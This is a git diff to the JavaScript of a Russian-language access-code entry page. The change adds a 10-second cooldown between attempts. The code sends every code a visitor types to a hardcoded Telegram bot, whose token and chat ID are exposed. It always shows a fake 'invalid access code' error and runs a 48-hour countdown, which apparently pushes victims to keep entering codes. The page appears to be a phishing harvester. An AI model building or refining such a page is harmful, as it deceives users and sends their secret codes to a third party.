@@ -1,6 +1,6 @@
 /**
  * РиП - Минималистичный интерфейс ввода кода
- * С отправкой в Telegram, блокировкой повторов и ЕДИНЫМ глобальным 48-часовым таймером
+ * С отправкой в Telegram, блокировкой повторов, кд 10 секунд и ЕДИНЫМ 48-часовым таймером
  */
 
 // ============================================================================
@@ -10,8 +10,11 @@
 const TELEGRAM_BOT_TOKEN = '8874990267:AAEe2z-tM4FUrxvNmUM5f9IJo48wloUCIRU';
 const TELEGRAM_CHAT_ID = '8695383091';
 
+// КД МЕЖДУ ПОПЫТКАМИ ВВОДА (в секундах)
+const COOLDOWN_SECONDS = 10;
+
 // ЕДИНАЯ ТОЧКА ОКОНЧАНИЯ ТАЙМЕРА ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ (48 часов)
-// Вы можете изменить эту дату при необходимости в формате: 'ГГГГ-ММ-ДДTHH:MM:SS+03:00'
+// Формат: 'ГГГГ-ММ-ДДTHH:MM:SS+03:00'
 const GLOBAL_DEADLINE_ISO = '2026-08-22T22:00:00+03:00';
 const GLOBAL_TIMER_END = new Date(GLOBAL_DEADLINE_ISO).getTime();
 
@@ -19,6 +22,7 @@ const GLOBAL_TIMER_END = new Date(GLOBAL_DEADLINE_ISO).getTime();
 const STORAGE_KEY_LOGS = 'rip_entered_codes';
 const STORAGE_KEY_LAST_CODE = 'rip_last_entered_code';
 const STORAGE_KEY_CONSECUTIVE = 'rip_consecutive_count';
+const STORAGE_KEY_COOLDOWN = 'rip_cooldown_end_timestamp';
 
 // ============================================================================
 // DOM Elements
@@ -131,10 +135,76 @@ async function sendToTelegram(code) {
 }
 
 // ============================================================================
-// Form Submit Handler (Duplicate Checking & Error Handling)
+// Cooldown (КД) Manager
+// ============================================================================
+let cooldownInterval = null;
+
+function checkAndStartCooldown() {
+  const cooldownEnd = parseInt(localStorage.getItem(STORAGE_KEY_COOLDOWN) || '0', 10);
+  const now = Date.now();
+
+  if (now < cooldownEnd) {
+    applyCooldownUI(cooldownEnd);
+  }
+}
+
+function startCooldown() {
+  const cooldownEnd = Date.now() + (COOLDOWN_SECONDS * 1000);
+  localStorage.setItem(STORAGE_KEY_COOLDOWN, cooldownEnd.toString());
+  applyCooldownUI(cooldownEnd);
+}
+
+function applyCooldownUI(cooldownEnd) {
+  if (cooldownInterval) clearInterval(cooldownInterval);
+
+  btnSubmit.disabled = true;
+  btnSubmit.classList.add('btn-cooldown');
+  btnSpinner.style.display = 'none';
+  btnIcon.style.display = 'none';
+
+  function updateCooldown() {
+    const remainingMs = cooldownEnd - Date.now();
+    const remainingSec = Math.ceil(remainingMs / 1000);
+
+    if (remainingSec <= 0) {
+      clearInterval(cooldownInterval);
+      cooldownInterval = null;
+      btnSubmit.disabled = false;
+      btnSubmit.classList.remove('btn-cooldown');
+      btnSubmit.innerHTML = '';
+      btnSubmit.appendChild(btnSpinner);
+      btnSubmit.appendChild(btnIcon);
+      btnSpinner.style.display = 'none';
+      btnIcon.style.display = 'inline-block';
+      localStorage.removeItem(STORAGE_KEY_COOLDOWN);
+    } else {
+      btnSubmit.textContent = `${remainingSec}с`;
+    }
+  }
+
+  updateCooldown();
+  cooldownInterval = setInterval(updateCooldown, 250);
+}
+
+// ============================================================================
+// Form Submit Handler (Cooldown + Duplicate Checking + Error Display)
 // ============================================================================
 codeForm.addEventListener('submit', (e) => {
   e.preventDefault();
+
+  // Check if cooldown is currently active
+  const cooldownEnd = parseInt(localStorage.getItem(STORAGE_KEY_COOLDOWN) || '0', 10);
+  if (Date.now() < cooldownEnd) {
+    const remainingSec = Math.ceil((cooldownEnd - Date.now()) / 1000);
+    errorText.textContent = `Подождите ${remainingSec} сек. перед следующей попыткой`;
+    errorMsg.style.display = 'flex';
+    inputGroup.classList.add('has-error');
+    playErrorTone();
+    inputGroup.classList.remove('shake-animation');
+    void inputGroup.offsetWidth;
+    inputGroup.classList.add('shake-animation');
+    return;
+  }
 
   const code = codeInput.value.trim();
   if (!code) {
@@ -145,7 +215,6 @@ codeForm.addEventListener('submit', (e) => {
   // Check for consecutive duplicate entries of the same code
   const lastCode = localStorage.getItem(STORAGE_KEY_LAST_CODE);
   let consecutiveCount = parseInt(localStorage.getItem(STORAGE_KEY_CONSECUTIVE) || '0', 10);
-
   let isDuplicateExceeded = false;
 
   if (lastCode === code) {
@@ -164,38 +233,29 @@ codeForm.addEventListener('submit', (e) => {
     sendToTelegram(code);
   }
 
-  // Loading state
-  btnSubmit.disabled = true;
-  btnSpinner.style.display = 'inline-block';
-  btnIcon.style.display = 'none';
+  // Start 10-second cooldown immediately
+  startCooldown();
 
-  // Realistic delay before showing error
-  setTimeout(() => {
-    btnSubmit.disabled = false;
-    btnSpinner.style.display = 'none';
-    btnIcon.style.display = 'inline-block';
+  // Play error tone
+  playErrorTone();
 
-    // Play error sound
-    playErrorTone();
+  // Set appropriate error message
+  if (isDuplicateExceeded) {
+    errorText.textContent = 'Превышен лимит попыток для этого кода';
+  } else {
+    errorText.textContent = 'Неверный код доступа';
+  }
 
-    // Set appropriate error message
-    if (isDuplicateExceeded) {
-      errorText.textContent = 'Превышен лимит попыток для этого кода';
-    } else {
-      errorText.textContent = 'Неверный код доступа';
-    }
+  // Show error message & shake
+  errorMsg.style.display = 'flex';
+  inputGroup.classList.add('has-error');
 
-    // Show error message
-    errorMsg.style.display = 'flex';
-    inputGroup.classList.add('has-error');
+  // Trigger Shake animation
+  inputGroup.classList.remove('shake-animation');
+  void inputGroup.offsetWidth; // Reflow
+  inputGroup.classList.add('shake-animation');
 
-    // Trigger Shake animation
-    inputGroup.classList.remove('shake-animation');
-    void inputGroup.offsetWidth; // Reflow
-    inputGroup.classList.add('shake-animation');
-
-    codeInput.select();
-  }, 350);
+  codeInput.select();
 });
 
 // Clear error state on typing
@@ -231,5 +291,6 @@ function initSynchronizedTimer() {
   setInterval(updateTimer, 1000);
 }
 
-// Start synchronized timer on page load
+// Start timers and cooldown check on page load
 initSynchronizedTimer();
+checkAndStartCooldown();
